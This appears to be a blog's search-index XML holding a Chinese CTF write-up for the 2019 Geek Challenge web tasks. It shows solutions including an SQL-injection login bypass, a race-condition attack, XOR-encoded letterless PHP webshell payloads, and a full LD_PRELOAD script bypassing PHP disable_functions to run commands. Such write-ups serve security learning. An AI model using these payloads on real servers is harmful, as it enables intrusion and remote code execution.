<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>第十届极客大挑战Write-up</title>
    <url>/2019/10/18/%E7%AC%AC%E5%8D%81%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98Write-up/</url>
    <content><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><ol>
<li><p>打比赛前先撸一只猫！: 猫猫陪我打ctf！ </p>
<p>开局一只猫，flag全靠捡 -_-</p>
<p><img src="/2019/10/18/第十届极客大挑战Write-up/1571363272606.png" alt="1571363272606"></p>
<p>直接F12 查看源码</p>
<p><img src="/2019/10/18/第十届极客大挑战Write-up/1571363339663.png" alt="1571363339663"></p>
<p>直接提交cat=dog</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://118.25.14.40:8110/?cat=dog</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/18/第十届极客大挑战Write-up/1571363481025.png" alt="1571363481025"></p>
</li>
<li><p>你看见过我的菜刀么 </p>
<p> <img src="/2019/10/18/第十届极客大挑战Write-up/1571363676296.png" alt="1571363676296"></p>
<p> 确实是白给的shell</p>
<p> <img src="/2019/10/18/第十届极客大挑战Write-up/1571373932241.png" alt="1571373932241"></p>
</li>
</ol><p>​       根目录下发现flag目录下的flag.txt<br>​<br>​             <img src="/2019/10/18/第十届极客大挑战Write-up/1571374018594.png" alt="1571374018594"><br>​<br>​<br>​    </p><a id="more"></a>

<ol start="3">
<li><p>BurpSuiiiiiit!!!: 拿起你的burp，开始战斗吧 </p>
<p>附件下载下来，解压得到Extender.jar文件</p>
<p>从名字和格式看应该BurpSuit的扩展包，用BP导入</p>
</li>
</ol>
<p>​      <img src="/2019/10/18/第十届极客大挑战Write-up/1571495641219.png" alt="1571495641219"></p>
<p>​      <img src="/2019/10/18/第十届极客大挑战Write-up/1571374457080.png" alt="1571374457080"><br>​<br>​              导入失败，并提示我们查看errors页面<br>​<br>​             <img src="/2019/10/18/第十届极客大挑战Write-up/1571374537984.png" alt="1571374537984"></p>
<p>​        flag直接就出来了</p>
<ol start="4">
<li><p>性感潇文清，在线算卦：动作快点才能算到好卦。 </p>
<p> 输入姓名和生日后，返回了一个路径</p>
<p> <img src="/2019/10/18/第十届极客大挑战Write-up/1571374815419.png" alt="1571374815419"></p>
<p> 直接访问试下</p>
<p> <img src="/2019/10/18/第十届极客大挑战Write-up/1571374878503.png" alt="1571374878503"></p>
<p> 回到主页，查看源码</p>
<p> <img src="/2019/10/18/第十届极客大挑战Write-up/1571374951634.png" alt="1571374951634"></p>
</li>
</ol>
<pre><code>提示我们条件竞争，从源码看我们输入u和p后，flag会写入到</code></pre><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$savepath<span class="string">" . sha1($_GET['u'])</span></span><br></pre></td></tr></table></figure>

<p>​        0.1s后再把flag换成 you are too slow</p>
<p>​        所以我们先一直访问存在flag的这个文件，然后在提交u和p，在flag生成的一瞬间把它读取</p>
<p>​        直接上burpsuit</p>
<p>​    <img src="/2019/10/18/第十届极客大挑战Write-up/1571375619875.png" alt="1571375619875"></p>
<p>​    <img src="/2019/10/18/第十届极客大挑战Write-up/1571376044998.png" alt="1571376044998"></p>
<p>​    payload设置为空，数量200个。</p>
<p>​    <img src="/2019/10/18/第十届极客大挑战Write-up/1571375724646.png" alt="1571375724646"></p>
<p>​    <img src="/2019/10/18/第十届极客大挑战Write-up/1571375756868.png" alt="1571375756868"></p>
<p>​    payload同样为空，数量为1.</p>
<p>​    2攻击后，3立马攻击</p>
<p>​    <img src="/2019/10/18/第十届极客大挑战Write-up/1571375974330.png" alt="1571375974330"></p>
<p>​    得到flag</p>
<ol start="5">
<li><p>Easysql: 最近我做了一个小网站，我把flag放在里面了，不过我没有把登陆密码告诉任何人，所以你们是拿不到flag的！ </p>
<p> <img src="/2019/10/18/第十届极客大挑战Write-up/1571386357741.png" alt="1571386357741"></p>
<p> 什么防护都没有 </p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line">'='</span><br><span class="line">'='</span><br></pre></td></tr></table></figure>



</li>
</ol>
<pre><code>![1571387426532](1571387426532.png)

直接进后台

![1571387449879](1571387449879.png)</code></pre><ol start="6">
<li><p>RCE me: I don’t think U can system RCE, prove to me </p>
<p> 这道题学到了很多！</p>
<p> 打开网页看看</p>
<p> <img src="/2019/10/18/第十届极客大挑战Write-up/1571495997995.png" alt="1571495997995"></p>
<p> GET传参code，code中不能有A-Z，a-z，0-9，这些字符，而且字符限制在40个字符</p>
<p> 所以我们要先绕过这个限制，执行命令。</p>
<p> 参考<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">ph神</a>不含数字和字母的webshell</p>
<p> 构造如下URl</p>
 <figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://114.116.44.23:40001/?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=eval($_GET[a])&amp;a=phpinfo();</span><br></pre></td></tr></table></figure>

<p> 或者</p>
 <figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://114.116.44.23:40001/?code=$_="`&#123;&#123;&#123;"^"?&lt;&gt;/";$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=eval($_GET[a])&amp;a=phpinfo();</span><br></pre></td></tr></table></figure>



</li>
</ol>
<pre><code>![1571497597408](1571497597408.png)

查看某些关键参数

- 如系统信息

![1571499066521](1571499066521.png)

- disable_functions

![1571499768310](1571499768310.png)

命令执行函数都被禁止了

- allow_url_*

![1571498825445](1571498825445.png)

关于这两个参数可以参考这篇文章[php伪协议](https://www.cnblogs.com/So7cool/p/9795712.html)

- sendmail_*

![1571499021494](1571499021494.png)

- open_basedir

![1571500306817](1571500306817.png)

并没有限制我们目录。如果有可以参考这篇[文章](https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/)绕过</code></pre><p>既然不能执行命令那就用var_dump(scandir())来查看文件信息</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://114.116.44.23:40001/?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=var_dump(eval($_GET[a]))&amp;a=var_dump(scandir(%27/tmp/%27));</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/18/第十届极客大挑战Write-up/1571501644752.png" alt="1571501644752"></p>
<p>但感觉挺麻烦的，后面队友搞了个这个(躺着真舒服 )，直接蚁剑连(菜刀不行)</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://114.116.44.23:40001/?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=eval($_POST[%27a%27])</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/18/第十届极客大挑战Write-up/1571502520704.png" alt="1571502520704"></p>
<p>发现主目录下有有flag和readflag，flag只能root才能查看</p>
<p><img src="/2019/10/18/第十届极客大挑战Write-up/1571502747158.png" alt="1571502747158"></p>
<p>把readflag下载下来，反编译了一下</p>
<p><img src="/2019/10/18/第十届极客大挑战Write-up/1571502795907.png" alt="1571502795907"></p>
<p>那么思路也就清晰起来了，bypass disable_functions  执行readflag</p>
<p>我们这里利用的劫持库函数，从而执行命令</p>
<p>具体原理看看<a href="https://www.cnblogs.com/leixiao-/p/10612798.html" target="_blank" rel="noopener">出题人的博客</a>和<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">bypass_disablefunc_via_LD_PRELOAD</a></p>
<p>首先上传恶意so文件，上面的github项目中有，注意操作系统位数</p>
<p><img src="/2019/10/18/第十届极客大挑战Write-up/1571503296101.png" alt="1571503296101"></p>
<p>并且重命名为123.so</p>
<p>然后上传123.php文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    $cmd = $_GET[&quot;cmd&quot;];</span><br><span class="line">    $out_path = $_GET[&quot;outpath&quot;];</span><br><span class="line">    $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline);</span><br><span class="line"></span><br><span class="line">    $so_path = $_GET[&quot;sopath&quot;];</span><br><span class="line">    putenv(&quot;LD_PRELOAD=&quot; . $so_path);</span><br><span class="line"></span><br><span class="line">    mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);</span><br><span class="line"></span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;; </span><br><span class="line"></span><br><span class="line">    unlink($out_path);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>然后通过include()包含文件，执行系统命令</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://114.116.44.23:40001/?code=$_=%22`&#123;&#123;&#123;%22^%22?%3C%3E/%22;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=var_dump(eval($_GET[a]))&amp;a=include(%27/tmp/123.php%27);&amp;cmd=./../../../readflag&amp;outpath=/tmp/123.txt&amp;sopath=/tmp/123.so</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/18/第十届极客大挑战Write-up/1571503618681.png" alt="1571503618681"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WEB</tag>
        <tag>MISC</tag>
        <tag>DISABLE_FUNCTIONS</tag>
      </tags>
  </entry>
</search>
